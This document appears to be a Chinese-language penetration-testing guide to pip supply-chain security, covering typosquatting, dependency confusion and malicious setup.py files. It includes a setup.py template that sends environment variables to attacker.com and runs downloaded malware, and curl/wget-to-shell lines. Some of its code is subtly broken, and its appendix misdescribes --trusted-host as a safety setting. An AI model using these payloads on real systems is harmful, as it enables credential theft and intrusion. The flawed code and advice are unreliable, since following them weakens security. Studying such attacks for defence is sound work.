# pip 供应链安全测试方法论

---

# 第一部分：文档概述

## 1.1 编写目的
- 为渗透测试人员提供 pip 供应链安全测试的系统化方法
- 指导测试人员识别 Python 项目依赖中的安全风险
- 帮助理解 PyPI 生态系统中的攻击面和防御措施

## 1.2 适用范围
- 适用于使用 pip/poetry/pipenv 的 Python 项目
- 适用于使用 PyPI 或私有 Python 包索引的场景
- 适用于 Web 应用、数据科学、自动化脚本等 Python 项目

## 1.3 读者对象
- 渗透测试工程师
- Python 开发人员
- 数据科学工程师
- DevSecOps 工程师

---

# 第二部分：核心渗透技术专题

## 专题一：pip 供应链安全测试

### 2.1 技术介绍

pip 供应链安全测试是指对 Python 项目的 pip 依赖进行系统性安全评估，识别依赖项中的已知漏洞、恶意包、setup.py 执行风险、凭证泄露等安全问题，确保项目依赖链的完整性和可信性。

**pip 供应链架构：**

```
┌─────────────────────────────────────────────────────────────┐
│                    pip 供应链架构                            │
├─────────────────────────────────────────────────────────────┤
│  开发者                                                     │
│    │ pip install                                            │
│    ▼                                                        │
│  requirements.txt (声明依赖)                                 │
│    │                                                        │
│    ▼                                                        │
│  PyPI (公共/私有)                                            │
│    │ 下载包                                                 │
│    ▼                                                        │
│  setup.py / pyproject.toml (构建配置)                        │
│    │ 安装时执行                                             │
│    ▼                                                        │
│  site-packages (安装依赖)                                    │
│    │                                                        │
│    ▼                                                        │
│  应用运行                                                   │
└─────────────────────────────────────────────────────────────┘
```

**常见安全问题：**

| 问题类型 | 描述 | 危害等级 |
|---------|------|---------|
| 已知漏洞 | 依赖包存在 CVE 漏洞 | 高 |
| 恶意包 | 包含恶意代码的 PyPI 包 | 严重 |
| Typosquatting | 包名拼写相似的恶意包 | 高 |
| setup.py 执行 | 安装时执行任意代码 | 严重 |
| 凭证泄露 | .pypirc 包含认证信息 | 高 |
| 依赖混淆 | 公共包名与内部包冲突 | 高 |
| 维护者风险 | 包维护者账户被盗 | 高 |

### 2.2 攻击常见于哪些业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| 新项目初始化 | pip install -r requirements.txt | 直接安装未审查的依赖 |
| 依赖更新 | pip install --upgrade | 更新到恶意版本 |
| CI/CD 构建 | pip install . | 自动安装所有依赖 |
| 数据科学项目 | Jupyter Notebook 依赖 | 大量使用第三方包 |
| 私有包发布 | twine upload | 可能发布恶意包 |
| setup.py 执行 | python setup.py install | 执行任意代码 |

### 2.3 漏洞探测方法

#### 2.3.1 黑盒测试

**步骤一：识别项目依赖**
```bash
# 检查 requirements.txt
curl https://target.com/requirements.txt
curl https://target.com/requirements-dev.txt

# 检查 setup.py
curl https://target.com/setup.py

# 检查 pyproject.toml
curl https://target.com/pyproject.toml
```

**步骤二：检查公开凭证**
```bash
# 检查 .pypirc 是否可访问
curl https://target.com/.pypirc

# 检查是否包含认证信息
[pypi]
username = __token__
password = pypi-xxxxx
```

**步骤三：漏洞扫描**
```bash
# 使用 pip-audit
pip-audit

# 使用 safety
safety check

# 使用 Snyk
npx snyk test
```

#### 2.3.2 白盒测试

**步骤一：审计依赖列表**
```bash
# 查看已安装依赖
pip freeze
pip list

# 检查依赖树
pip install pipdeptree
pipdeptree

# 检查过时的依赖
pip list --outdated
```

**步骤二：检查 setup.py**
```python
# setup.py
from setuptools import setup
import os
import subprocess

# 风险代码示例
os.system("curl http://attacker.com/backdoor.sh | sh")
subprocess.call(["wget", "http://attacker.com/malware"])

# 检查危险函数
grep -E "os\.system|subprocess|exec|eval|urllib|requests" setup.py
```

**步骤三：检查依赖包内容**
```bash
# 检查包的 setup.py
cat /path/to/site-packages/package-name/setup.py

# 检查包的可疑文件
find /path/to/site-packages/package-name -name "*.py" -exec grep -l "subprocess\|urllib\|os.system" {} \;

# 检查包的网络请求
grep -r "urllib.request\|requests.get" /path/to/site-packages/package-name/
```

### 2.4 漏洞利用方法

#### 2.4.1 Typosquatting 攻击

```bash
# 1. 识别流行包
# requests, numpy, pandas, django, flask 等

# 2. 注册相似名称的包
# requests -> requests-python, request
# numpy -> numby, num-py
# pandas -> panda, pandas-python

# 3. 发布恶意包
python setup.py sdist
twine upload dist/*
```

#### 2.4.2 依赖混淆攻击

```bash
# 1. 识别内部包名
# 通过源码、错误信息、文档

# 2. 在 PyPI 注册相同包名
# company-internal-utils

# 3. 添加恶意代码
# setup.py 中执行恶意代码

# 4. 发布到 PyPI
twine upload dist/*

# 5. 如果目标配置不当，会从 PyPI 拉取
```

#### 2.4.3 setup.py 恶意代码

```python
# setup.py
from setuptools import setup
import os
import platform
import urllib.request

class CustomInstall:
    def run(self):
        # 窃取信息
        info = {
            'cwd': os.getcwd(),
            'user': os.getlogin(),
            'platform': platform.system(),
            'env': dict(os.environ)
        }
        
        # 外带数据
        urllib.request.urlopen(
            f"http://attacker.com/exfil?data={urllib.parse.quote(str(info))}"
        )
        
        # 执行命令
        os.system("wget http://attacker.com/malware.py && python malware.py")

setup(
    name='legitimate-package',
    version='1.0.0',
    cmdclass={'install': CustomInstall},
    # ...
)
```

#### 2.4.4 凭证窃取

```bash
# 1. 窃取 PyPI 凭证
# ~/.pypirc 包含 username/password

# 2. 窃取其他凭证
# AWS, GCP, Azure 等云凭证
# 数据库凭证
# API 密钥

# 3. 使用窃取的凭证
# 发布恶意包或访问私有仓库
```

### 2.5 漏洞利用绕过方法

#### 2.5.1 绕过安全扫描

```bash
# 1. pip-audit 只扫描已知漏洞
# 恶意包可能不在数据库中

# 2. 使用代码混淆
# 隐藏恶意代码

# 3. 延迟执行
# 安装时不执行，运行时才执行
```

#### 2.5.2 绕过依赖锁定

```bash
# 1. 如果目标无 requirements.txt
# pip install 会获取最新版本

# 2. 如果目标运行 pip install --upgrade
# 会更新到最新版本

# 3. 利用依赖范围
# package>=1.0.0 会安装最新兼容版本
```

---

# 第三部分：附录

## 3.1 pip 安全检测命令

```bash
# 安全审计
pip-audit
safety check

# 检查依赖
pip freeze
pip list --outdated
pipdeptree

# 检查包内容
pip show package-name
pip download package-name  # 下载包文件

# 验证包完整性
pip install --no-deps package-name  # 只安装包本身
```

## 3.2 pip 安全配置

```bash
# 使用私有仓库
pip install --index-url https://private-pypi.com/simple

# 禁用缓存
pip install --no-cache-dir

# 只使用可信源
pip install --trusted-host pypi.org --trusted-host files.pythonhosted.org

# 保存凭证时使用 token
[pypi]
username = __token__
password = pypi-xxxxx
```

## 3.3 恶意包检测指标

| 指标 | 检测方法 | 风险等级 |
|-----|---------|---------|
| 新发布的包 | 检查发布时间 | 中 |
| 下载量极低 | pip download stats | 中 |
| 维护者单一 | pip show maintainers | 中 |
| setup.py 包含系统调用 | 检查 setup.py | 严重 |
| 代码混淆 | 检测混淆模式 | 高 |
| 网络请求 | 检测 urllib/requests | 高 |
| 系统命令 | 检测 subprocess/os | 严重 |

## 3.4 安全工具

| 工具名称 | 用途 | 链接 |
|---------|------|------|
| pip-audit | pip 依赖审计 | https://pypi.org/project/pip-audit/ |
| safety | Python 安全扫描 | https://pyup.io/safety/ |
| bandit | Python 代码安全扫描 | https://github.com/PyCQA/bandit |
| Snyk | 依赖安全扫描 | https://snyk.io/ |

---

## 参考资源

- [pip Security Documentation](https://pip.pypa.io/en/stable/)
- [PyPI Security](https://pypi.org/security/)
- [Snyk Python Vulnerability Database](https://snyk.io/vuln/python)
- [Python Packaging User Guide](https://packaging.python.org/)
